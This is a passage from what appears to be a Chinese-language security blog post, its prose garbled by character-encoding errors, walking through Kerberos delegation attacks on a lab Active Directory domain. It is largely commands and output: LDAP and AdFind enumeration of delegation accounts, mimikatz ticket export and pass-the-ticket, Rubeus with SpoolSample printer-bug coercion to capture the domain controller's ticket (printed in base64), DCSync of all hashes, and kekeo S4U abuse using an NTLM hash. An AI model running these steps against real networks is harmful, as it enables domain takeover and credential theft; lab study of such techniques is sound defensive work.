<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br><span class="line">AdFind V01.56.00cpp Joe Richards (support@joeware.net) April 2021</span><br><span class="line"></span><br><span class="line">Using server: DC.redteam.local:389</span><br><span class="line">Directory: Windows Server 2016</span><br><span class="line"></span><br><span class="line">dn:CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: DC</span><br><span class="line">&gt;distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">dn:CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: MSSQL</span><br><span class="line">&gt;distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2 Objects returned</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>



<h4 id="2-1-3-ldapsearch"><a href="#2-1-3-ldapsearch" class="headerlink" title="2.1.3 ldapsearch"></a>2.1.3 ldapsearch</h4><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€#</span><br></pre></td></tr></table></figure>



<h3 id="2-2-éçº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#2-2-éçº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="2.2 éçº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>2.2 éçº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><p>æˆ‘ä»¬åœ¨mssqlè¿™å°æœºå™¨è®¿é—®åŸŸæ§ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6FzF.png" alt="wX6FzF.png"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯è®¿é—®æ˜¯æ‹’ç»çš„ã€‚ç„¶åæˆ‘ä»¬ç”¨åŸŸç®¡è´¦æˆ·å»è®¿é—®MSSQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;dir \\MSSQL.redteam.local\c$</span><br></pre></td></tr></table></figure>



<p>è¿™ä¸ªæ—¶å€™åœ¨MSSQLè¿™å°æœºå™¨çš„lsass.exeå†…å­˜ä¸­ä¼šå­˜åœ¨åŸŸç®¡administratorè´¦æˆ·çš„TGTç¥¨æ®ã€‚ç„¶ååœ¨MSSQLæœºå™¨è¿è¡Œmimikatzã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">å¯¼å‡ºç¥¨æ®</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Rir.png" alt="wX6Rir.png"></p>
<p>ç„¶åå†æ³¨å…¥ç¥¨æ®åˆ°å†…å­˜é‡Œé¢ï¼Œå†è®¿é—®åŸŸæ§ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯¼å…¥ç¥¨æ®</span><br><span class="line">kerberos::ptt xxx.kirbi</span><br><span class="line">æŸ¥çœ‹ç¥¨æ®</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>



<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6xqJ.png" alt="wX6xqJ.png"></p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Tx0.png" alt="wX6Tx0.png"></p>
<h3 id="2-3-éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº"><a href="#2-3-éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº" class="headerlink" title="2.3 éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº"></a>2.3 éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº</h3><p>é»˜è®¤æƒ…å†µä¸‹SpooleræœåŠ¡æ˜¯è‡ªåŠ¨å¼€å¯çš„ã€‚</p>
<p>ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜èº«ä»½è¿è¡ŒRubeusæ¥ç›‘å¬äº‹ä»¶idä¸º4624çš„äº‹ä»¶ï¼Œç„¶åæ—¶é—´è®¾ç½®ä¸º1ç§’ï¼Œå¯ä»¥æˆªå–åˆ°åŸŸæ§çš„TGTã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br></pre></td></tr></table></figure>

<p>ç„¶é€šè¿‡SpoolSample.exeå‘åŸŸæ§å‘èµ·è¯·æ±‚ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC MSSQL</span><br></pre></td></tr></table></figure>

<p>RubeusæˆåŠŸæ¥å—åˆ°äº†TGT</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIzwN.png" alt="wXIzwN.png"></p>
<p>å¤åˆ¶ç›‘å¬åˆ°çš„TGTçš„base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIE+jCCBPagAwIBBaEDAgEWooIEETCCBA1hggQJMIIEBaADAgEFoQ8bDVJFRFRFQU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDVJFRFRFQU0uTE9DQUyjggPHMIIDw6ADAgEXoQMCAQKiggO1BIIDsTRd7H8nT8n2+xhFjdYxWkeGwWptrnyKLgxn746x3g+68Wa92RV8mkudwvNSHPEbhA05tXVs62KwV/TjlhSHcjW9U8KfzgGdJpcpF8JrbW+X0ON4J0SyuwtcubsOiulJ6yiyH4riFlMTcl6TXMdbWCnOwIriPfOnQP/jtkcZWx2J27Y2HZ8cCAL00aV14S+ajcA65Howkx1/0ts+YQVZhFpc6l9fFQfGp9R87CjPNpWXEJV0iUGSELptTfXTxNSr/oF3+G7U0KrNl+9NMjloU6tFy/gnmc1PbDnUNXYgdKssUvxUpBzfVxq7leBkX1chx91kPcRrqAZC+tUWSoyULTkCPB8OcYY2DwHy4ElaQbo3y1mmq2DtHTx/ulGvwfKbpQrDgVSKZjE7VGdQSD7eAUJB7Pbu+lHsPc30DLVIbxJEQlC7WRKi1tNc6mhQJtAEGQFUUdYSQNtvNpiphZEfNGUoPaTz/9QspD9jjyVv+Dm7lqup5ojDSAxxc0Gzg61c4KmW3pJlmVQaN4f9Of+LeuqR3tR5EWxPqmkTgv1eVwdGryiF0cNC5Q7SAxrr6mgL2pL2HpMMILwhLSWlk0YIt6qdlyhRRdBzgopSzN5yB3IkSK4RXAF4CFYbximorzkIa9jG34ge9FlSVRkjUxNXb5KnCTDhLymT3F3tJeZoGig4Q+O9pfuUutsuxzSsy8u6xuuXkvg//LuXvDDOuVbOuKHR05tPfc1f9nKqs/YclidoYN3Nf/51pgF4n0ZXieHu5hgZYhb//qKh1X51ezI0MQ1gwkmssF9724s0U1QcLIS4ts3XxPCaDfuOeOLJUoMyqt0BdvYdVn6uGl0b2kCYwtk8ouIfuBbGeSYyGcSo+//tyTNJL57TCy42wRkFecRDdsBrRP8Je46fHBDPp7dhfOwP29Yt4nHFEtCKmjNeYLKQmQnKJ2i4AJKkOyi3QYPcf8Q+uzgU8c5V4p8kj+YBtvUMKQx6Dy1+MTfFz3tY1pQ7KB2pHziop/mm1f6ZPXNtoqcrtlCL+YGDEtgAPxSqaf3eAUhXar39qpUV1ey2Y7Pv/NZg8NevdUUG83LVXIiHHbwGTPBQgccrg9qC0cGHEHs0TNy7cLKc/8s86ZCzvBffmp/Q77QKZIH6jwvxopDjnO0s5jE9F7DVqBK51AWtPuSufXbOTqNMih90jxDJrb9cOZsIqadS7K6fJK232uUHCqSBP4H7QORFRPsCV6YFR13uzFutz+zN59+Y76NUrmhkqqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEFo/U0fj+283YVzNrDWB7b+hDxsNUkVEVEVBTS5MT0NBTKIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIxMTAwMzEyNDAzMlqmERgPMjAyMTEwMDMyMjQwMjlapxEYDzIwMjExMDEwMTI0MDI5WqgPGw1SRURURUFNLkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1SRURURUFNLkxPQ0FM</span><br></pre></td></tr></table></figure>



<p>å†Rubeuså¯¼å…¥base64çš„ç¥¨æ®ç›´æ¥æ³¨å…¥è¿›å†…å­˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥klistçœ‹åˆ°ç¥¨æ®å·²ç»å¯¼å…¥æˆåŠŸ</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIEBs.png" alt="wXIEBs.png"></p>
<p>ç„¶åå°±å¯ä»¥ç›´æ¥dcsync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:redteam.local /all /csv</span><br></pre></td></tr></table></figure>



<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIYJ7.png" alt="wXIYJ7.png"></p>
<h2 id="0x03-çº¦æŸæ€§å§”æ´¾"><a href="#0x03-çº¦æŸæ€§å§”æ´¾" class="headerlink" title="0x03 çº¦æŸæ€§å§”æ´¾"></a>0x03 çº¦æŸæ€§å§”æ´¾</h2><p>æ“ä½œç¯å¢ƒï¼š</p>
<blockquote>
<p>åŸŸï¼šredteam.local</p>
<p>åŸŸæ§ï¼šDC.redteam.localã€‚ä¸»æœºåï¼šDCã€‚ipï¼š192.168.11.16</p>
<p>åŸŸç®¡è´¦æˆ·ï¼šAdministrator/test123..</p>
<p>åŸŸå†…æœºå™¨ï¼šMSSQL.redteamã€‚ipï¼š192.168.11.8ã€‚æ™®é€šè´¦æˆ·ï¼šhack/test123..</p>
</blockquote>
<p><strong>å‰æï¼š</strong>åœ¨æœåŠ¡Aä¸Šé…ç½®åˆ°æœåŠ¡Bçº¦æŸæ€§å§”æ´¾(åŸŸç®¡ç†å‘˜æ‰æœ‰æƒé™é…ç½®)</p>
<p>1.ç”¨æˆ·è®¿é—®æœåŠ¡Aï¼Œäºæ˜¯å‘åŸŸæ§è¿›è¡Œkerberosè®¤è¯ï¼ŒåŸŸæ§è¿”å›ST1æœåŠ¡ç¥¨æ®ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä½¿ç”¨æ­¤æœåŠ¡ç¥¨æ®è®¿é—®æœåŠ¡A</p>
<p>2.è‹¥è¯¥æœåŠ¡Aå…è®¸å§”æ´¾ç»™æœåŠ¡Bï¼Œåˆ™Aèƒ½ä½¿ç”¨S4U2Proxyåè®®å°†ç”¨æˆ·å‘é€ç»™è‡ªå·±çš„å¯è½¬å‘çš„ST1æœåŠ¡ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½å†è½¬å‘ç»™åŸŸæ§åˆ¶å™¨ã€‚äºæ˜¯åŸŸæ§è¿”å›ç»™æœåŠ¡Aä¸€ä¸ªST2æœåŠ¡ç¥¨æ®ï¼Œ</p>
<p>3.æœåŠ¡Aä¾¿èƒ½ä½¿ç”¨è·å¾—çš„ST2æœåŠ¡ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½è®¿é—®æœåŠ¡Bã€‚</p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœåŠ¡Açš„è´¦å·ï¼Œå¹¶ä¸”æœåŠ¡Aé…ç½®äº†åˆ°åŸŸæ§çš„CIFSæœåŠ¡çš„çº¦æŸæ€§å§”æ´¾ã€‚åˆ™æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœåŠ¡Aä»¥administratorèº«ä»½è®¿é—®åŸŸæ§çš„CIFSæœåŠ¡ï¼Œå³ç›¸å½“äºæ§åˆ¶äº†åŸŸæ§ã€‚</p>
<p>åœ¨kerberosåè®®é‡Œé¢å­˜åœ¨ä¸¤ä¸ªæ‹“å±•å­åè®®S4u2sefltå’ŒS4u2Proxyã€‚æœåŠ¡è´¦å·åªèƒ½è·å–ç”¨æˆ·çš„TGSï¼Œè¿™ä¸ªæ—¶å€™å°±åªèƒ½æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIwmG.png" alt="wXIwmG.png"></p>
<p>å½“è¢«é…ç½®äº†çº¦æŸå§”æ´¾çš„è´¦æˆ·çš„userAccountControlå±æ€§æœ‰ä¸ªFLAGä½ TRUSTED_TO_AUTH_FOR_DELEGATIONï¼Œå¹¶ä¸”msDS-AllowedToDelegateTo å±æ€§è¿˜ä¼šæŒ‡å®šå¯¹å“ªä¸ªSPNè¿›è¡Œå§”æ´¾ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIfay.png" alt="wXIfay.png"></p>
<h3 id="3-1-ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·"><a href="#3-1-ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·" class="headerlink" title="3.1 ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·"></a>3.1 ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·</h3><h4 id="3-1-1-ldapsearch"><a href="#3-1-1-ldapsearch" class="headerlink" title="3.1.1 ldapsearch"></a>3.1.1 ldapsearch</h4><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-FuckLdap"><a href="#3-1-2-FuckLdap" class="headerlink" title="3.1.2 FuckLdap"></a>3.1.2 FuckLdap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FuckLdap.exe -d 192.168.11.16 -u hack -p test123.. --Checkdelegation</span><br></pre></td></tr></table></figure>

<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIGaM.png" alt="wXIGaM.png"></p>
<h3 id="3-2-çº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#3-2-çº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="3.2 çº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>3.2 çº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><p>æˆ‘ä»¬è¿™é‡Œè®¾ç½®äº†MSSQLè¿™ä¸ªæœºå™¨ç”¨æˆ·å¯¹DCçš„cifsæœåŠ¡çš„å§”æ´¾ã€‚</p>
<p>å½“æˆ‘ä»¬è¦è¿›è¡Œçº¦æŸå§”æ´¾æ”»å‡»çš„å‰æå°±æ˜¯æ‹¿åˆ°è¿™å°å¯ç”¨äº†çº¦æŸå§”æ´¾çš„æœºå™¨æƒé™ã€‚</p>
<p><strong>ç”ŸæˆTGT</strong></p>
<p>é¦–å…ˆç”ŸæˆTGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:MSSQL$ /domain:redteam.local /NTLM:29de42b31e2b7961fda4fbe648d062c9&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>



<p><strong>è·å¾—ST</strong></p>
<p>ä½¿ç”¨è¿™å¼ TGTé€šè¿‡ä¼ªé€ s4Uè¯·æ±‚ä»¥administratorç”¨æˆ·èº«ä»½è¯·æ±‚å»è®¿é—®DCçš„cifsçš„ST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_MSSQL$@REDTEAM.LOCAL_krbtgt~redteam.local@REDTEAM.LOCAL.kirbi /user:Administrator@redteam.local /service:cifs/DC.redteam.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>



<p><code>S4U2Self</code>è·å–åˆ°çš„ST1ä»¥åŠ<code>S4U2Proxy</code>è·å–åˆ°çš„DC CIFSæœåŠ¡çš„ST2ä¼šä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹</p>
<p><strong>æ³¨å…¥ST2</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@redteam.local@REDTEAM.LOCAL_cifs~DC.redteam.local@REDTEAM.LOCAL.kirbi</span><br></pre></td></tr></table></figure>



<p>ç„¶åè®¿é—®åŸŸæ§</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIHEt.png" alt="wXIHEt.png"></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/" rel="next" title="kerberosåè®®åŠé—®é¢˜">
                <i class="fa fa-chevron-left"></i> kerberosåè®®åŠé—®é¢˜
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://avatars.githubusercontent.com/u/47177122?v=4"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yicunyiye" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-c-%E6%A3%80%E6%B5%8B%E5%A7%94%E6%B4%BE%E8%B4%A6%E6%88%B7"><span class="nav-number">1.</span> <span class="nav-text">0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01%E5%A7%94%E6%B4%BE"><span class="nav-number">2.</span> <span class="nav-text">0x01å§”æ´¾</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">2.1.</span> <span class="nav-text">0x02 éçº¦æŸå§”æ´¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%AD%9B%E9%80%89%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%9A%84%E8%B4%A6%E5%8F%B7"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.1 ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-powerview-ps1"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">2.1.1 powerview.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-ADFind"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">2.1.2 ADFind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-3-ldapsearch"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">2.1.3 ldapsearch</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.2 éçº¦æŸæ€§å§”æ´¾æ”»å‡»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E9%85%8D%E5%90%88%E6%89%93%E5%8D%B0%E6%9C%BA"><span class="nav-number">2.1.3.</span> <span class="nav-text">2.3 éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">2.2.</span> <span class="nav-text">0x03 çº¦æŸæ€§å§”æ´¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%AD%9B%E9%80%89%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%B4%A6%E5%8F%B7"><span class="nav-number">2.2.1.</span> <span class="nav-text">3.1 ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-ldapsearch"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">3.1.1 ldapsearch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-FuckLdap"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">3.1.2 FuckLdap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.2.</span> <span class="nav-text">3.2 çº¦æŸæ€§å§”æ´¾æ”»å‡»</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">1</span>

  
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  æœ¬ç«™è®¿å®¢æ•°:<span id="busuanzi_value_site_uv"></span>
</span>
</div>





  <span class="post-meta-divider">|</span>



   v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
